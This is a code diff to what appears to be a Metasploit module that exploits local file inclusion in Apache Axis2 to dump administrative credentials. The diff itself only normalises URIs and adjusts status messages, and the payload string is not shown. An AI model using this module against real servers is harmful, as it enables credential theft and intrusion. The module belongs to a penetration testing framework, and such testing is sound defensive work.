@@ -42,11 +42,12 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def target_url
-		"http://#{vhost}:#{rport}#{datastore['URI']}"
+		uri = normalize_uri(datastore['URI'])
+		"http://#{vhost}:#{rport}#{uri}"
 	end
 
 	def run_host(ip)
-		uri = datastore['URI']
+		uri = normalize_uri(datastore['URI'])
 
 		begin
 			res = send_request_raw({
@@ -57,11 +58,11 @@ class Metasploit3 < Msf::Auxiliary
 			if (res and res.code == 200)
 				extract_uri = res.body.to_s.match(/\/axis2\/services\/([^\s]+)\?/)
 				new_uri = "/axis2/services/#{$1}"
-
+				new_uri = normalize_uri(new_uri)
 				get_credentials(new_uri)
 
 			else
-				print_status("#{target_url} - Apache Axis - The remote page not accessible")
+				print_status("#{uri} - Apache Axis - The remote page not accessible")
 				return
 
 			end
@@ -81,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
 				'uri'     => "#{uri}" + lfi_payload,
 			}, 25)
 
-			print_status("#{target_url} - Apache Axis - Dumping administrative credentials")
+			print_status("#{uri} - Apache Axis - Dumping administrative credentials")
 
 			if (res and res.code == 200)
 				if res.body.to_s.match(/axisconfig/)
